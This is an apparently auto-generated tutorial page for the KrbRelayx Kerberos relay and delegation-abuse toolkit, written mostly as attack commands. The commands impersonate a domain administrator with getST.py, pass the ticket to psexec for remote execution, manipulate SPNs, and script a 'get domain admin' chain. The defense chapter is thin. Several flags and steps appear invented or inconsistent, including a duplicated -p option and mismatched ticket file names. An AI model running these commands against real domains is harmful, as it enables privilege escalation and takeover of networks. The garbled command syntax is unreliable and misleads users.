---
tool_name: "krbrelayx"
display_name: "KrbRelayx"
mitre_tactic: "credential_access"
mitre_tactic_id: "TA0006"
mitre_subcategory: "kerberos"
install_command: "sudo apt install krbrelayx"
version: "1.0"
github_repo: "https://github.com/dirkjanm/krbrelayx"
kali_tools_page: "https://www.kali.org/tools/krbrelayx/"
difficulty_level: "advanced"
requires_root: false
gui_available: false
tags: ["kerberos", "active-directory", "windows", "relay", "authentication"]
related_tools: ["impacket", "ntlmrelayx", "certipy"]
---

# KrbRelayx

## Chapter 1: Introduction & Overview

### What is KrbRelayx?
KrbRelayx is a suite of tools for abusing Kerberos delegation and performing Kerberos relay attacks against Active Directory.

### History & Background
- **Created:** 2019 by dirkjanm
- **Maintained:** dirkjanm
- **License:** GNU General Public License v2
- **Purpose:** Kerberos relay attacks

KrbRelayx exploits Kerberos delegation misconfigurations.

### When to Use This Tool
- **Penetration testing:** Attack AD delegation
- **Red team operations:** Bypass security controls
- **Security assessments:** Test Kerberos security
- **CTF challenges:** Solve AD challenges

### Key Concepts
- **Kerberos:** Network authentication protocol
- **Delegation:** Service impersonation
- **Constrained Delegation:** Limited impersonation
- **Unconstrained Delegation:** Full impersonation
- **Relay:** Forwarding authentication

### Tools Included
| Tool | Description |
|------|-------------|
| `krbrelayx.py` | Kerberos relay tool |
| `addspn.py` | SPN manipulation |
| `getTGT.py` | Ticket acquisition |
| `getST.py` | Service ticket acquisition |

---

## Chapter 2: Installation & Setup

### System Requirements
- **OS:** Linux
- **Python:** 3.x
- **Access:** Domain user

### Installation Methods

#### Method 1: From Source
```bash
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
pip install -r requirements.txt
```

### Verification
```bash
python3 krbrelayx.py --help
```

---

## Chapter 3: Basic Usage

### First Attack

#### Kerberos Relay
```bash
python3 krbrelayx.py -t target.domain.local -s user
```
**Output:** Performs Kerberos relay attack.

#### Get Service Ticket
```bash
python3 getST.py -spn MSSQLSvc/target.domain.local -impersonate administrator domain/user:password
```
**Output:** Gets service ticket for impersonation.

### Essential Commands

#### Kerberos Relay
```bash
python3 krbrelayx.py -t target.domain.local -s user
```
**Explanation:** Relays Kerberos authentication.

#### Get Service Ticket
```bash
python3 getST.py -spn MSSQLSvc/target.domain.local -impersonate administrator domain/user:password
```
**Explanation:** Gets service ticket for impersonation.

### Complete Command Reference

#### krbrelayx.py Commands
| Command | Description | Example |
|---------|-------------|---------|
| `-t` | Target host | `python3 krbrelayx.py -t target.domain.local` |
| `-s` | Service name | `python3 krbrelayx.py -s MSSQLSvc` |
| `-u` | Username | `python3 krbrelayx.py -u user` |
| `-p` | Password | `python3 krbrelayx.py -p password` |
| `-d` | Domain | `python3 krbrelayx.py -d domain.local` |
| `-dc` | Domain controller | `python3 krbrelayx.py -dc dc01.domain.local` |
| `-l` | Listen address | `python3 krbrelayx.py -l 0.0.0.0` |
| `-p` | Listen port | `python3 krbrelayx.py -p 80` |

#### getST.py Commands
| Command | Description | Example |
|---------|-------------|---------|
| `-spn` | Service principal | `python3 getST.py -spn MSSQLSvc/target` |
| `-impersonate` | Impersonate user | `python3 getST.py -impersonate administrator` |
| `-dc-ip` | Domain controller | `python3 getST.py -dc-ip 192.168.1.1` |
| `-request` | Request ticket | `python3 getST.py -request` |
| `-save` | Save ticket | `python3 getST.py -save ticket.kirbi` |

#### addspn.py Commands
| Command | Description | Example |
|---------|-------------|---------|
| `-u` | Username | `python3 addspn.py -u user` |
| `-p` | Password | `python3 addspn.py -p password` |
| `-t` | Target user | `python3 addspn.py -t target_user` |
| `-s` | SPN | `python3 addspn.py -s MSSQLSvc/target` |
| `-a` | Add SPN | `python3 addspn.py -a` |
| `-d` | Delete SPN | `python3 addspn.py -d` |
| `-c` | Check SPN | `python3 addspn.py -c` |

---

## Chapter 4: Intermediate Usage

### Advanced Attack Techniques

#### Unconstrained Delegation
```bash
# Find unconstrained delegation
python3 krbrelayx.py -t dc01.domain.local -s cifs

# Relay to domain controller
python3 krbrelayx.py -t dc01.domain.local -s cifs -relay-user administrator
```

#### Constrained Delegation
```bash
# Get service ticket
python3 getST.py -spn MSSQLSvc/target.domain.local -impersonate administrator domain/user:password

# Use ticket
export KRB5CCNAME=administrator.ccache
python3 impacket-mssqlclient target.domain.local -windows-auth
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Automated kerberos attack
DOMAIN="domain.local"
USER="admin"
PASS="password"
TARGET="dc01.domain.local"

# Get service ticket
python3 getST.py -spn cifs/$TARGET -impersonate administrator $DOMAIN/$USER:$PASS -save ticket.kirbi

# Use ticket
export KRB5CCNAME=administrator.ccache
```

#### Python Scripting
```python
#!/usr/bin/env python3
from krbrelayx import krbrelayx

def kerberos_relay(target, spn, user, password, domain):
    """Perform kerberos relay"""
    # Implementation
    pass
```

### Combining with Other Tools

#### With Impacket
```bash
# Get ticket
python3 getST.py -spn cifs/target.domain.local -impersonate administrator domain/user:password

# Use with impacket
export KRB5CCNAME=administrator.ccache
impacket-psexec domain/administrator@target.domain.local -k -no-pass
```

#### With Rubeus
```bash
# Use ticket with Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Advanced Configurations

#### Custom SPN
```bash
# Add custom SPN
python3 addspn.py -u domain/user -p password -t target_user -s MSSQLSvc/target.domain.local -a
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### Resource-Based Constrained Delegation
```bash
# Add computer account
python3 addspn.py -u domain/user -p password -t target_user -s cifs/target.domain.local -a

# Get ticket
python3 getST.py -spn cifs/target.domain.local -impersonate administrator domain/user:password
```

### Integration in Pentest Workflow

#### Phase 1: Reconnaissance
```bash
# Find delegation
impacket-findDelegation domain/user:password
```

#### Phase 2: Exploitation
```bash
# Get service ticket
python3 getST.py -spn cifs/target.domain.local -impersonate administrator domain/user:password

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec domain/administrator@target.domain.local -k -no-pass
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Get domain admin

**Steps:**
```bash
# 1. Find delegation
impacket-findDelegation domain/user:password

# 2. Get service ticket
python3 getST.py -spn cifs/target.domain.local -impersonate administrator domain/user:password

# 3. Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec domain/administrator@target.domain.local -k -no-pass
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect KrbRelayx

#### Network Indicators
```
# Unusual SPN requests
# Kerberos relay attempts
# Delegation abuse
```

#### Log Analysis
```bash
# Monitor Event ID 4769
# Check for unusual SPN requests
# Alert on delegation changes
```

### Mitigation Strategies

#### Delegation Security
```bash
# Use constrained delegation
# Implement resource-based constraints
# Monitor delegation changes
```

### Blue Team Response
1. **Monitor delegation** - Detect changes
2. **Use constrained delegation** - Limit exposure
3. **Implement gMSA** - Managed service accounts
4. **Monitor SPN changes** - Alert on modifications

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
**Cause:** SPN not found
**Solution:**
```bash
# Check SPN
python3 addspn.py -u domain/user -p password -t target_user -c

# Add SPN if needed
python3 addspn.py -u domain/user -p password -t target_user -s cifs/target -a
```

### FAQ

**Q: Is krbrelayx legal to use?**
A: Yes, krbrelayx is a legitimate security testing tool. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I install krbrelayx?**
A: Clone from GitHub and install requirements.

---

## Resources

### Official Documentation
- [KrbRelayx GitHub](https://github.com/dirkjanm/krbrelayx)
- [KrbRelayx Wiki](https://github.com/dirkjanm/krbrelayx/wiki)

### Related Tools
- **Impacket:** Python network toolkit
- **Rubeus:** Kerberos toolkit
- **Certipy:** AD certificate abuse

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
